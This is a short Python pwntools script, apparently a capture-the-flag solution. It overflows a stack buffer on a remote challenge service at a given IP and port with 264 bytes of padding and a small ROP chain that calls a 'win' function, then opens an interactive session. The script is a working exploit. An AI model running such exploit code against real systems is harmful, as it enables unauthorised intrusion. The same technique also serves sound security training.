from pwn import *

#p = process("./chall")
p = remote("103.167.132.234", 2211)

context.log_level='debug'

payload = b'a'*264
#payload += p64(0x0000000000401016) #ret
payload += p64(0x000000000040118a) #pop rdi pop rbp
payload += p64(0xdeadbeef)
payload += p64(0x0000000000401016) #ret
payload += p64(0x00000000004011d1) #win

p.sendline(payload)
p.interactive()
